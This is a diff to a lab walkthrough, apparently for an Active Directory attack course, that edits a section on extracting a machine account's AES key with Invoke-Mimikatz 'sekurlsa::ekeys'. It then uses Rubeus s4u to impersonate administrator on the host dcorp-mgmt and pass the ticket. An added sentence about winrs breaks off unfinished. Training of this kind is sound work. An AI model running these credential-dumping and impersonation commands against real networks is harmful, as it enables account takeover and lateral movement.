@@ -510,7 +510,7 @@ Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 > **Note -:** With the above command we wanna extract the AES key for 'dcorp-student1$', which we will use with `rubeus` to access `dcorp-mgmt`, however you might find multiple accounts for this user, so you should take note of this SID - `S-1-5-18` - as this is the SI for system account and that is what we want
 
 
-- Use the AES key of `dcorp-studentx$` with Rubeus and access dcorp-mgmt as ANY user we want:
+- Use the AES key of `dcorp-studentx$` with `Rubeus` and access dcorp-mgmt as ANY user we want:
 
 ```powershell
 Rubeus.exe s4u /user:dcorp-student1$
@@ -518,3 +518,6 @@ Rubeus.exe s4u /user:dcorp-student1$
 83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt
 /impersonateuser:administrator /ptt
 ```
+
+
+We can then use `winrs` to 
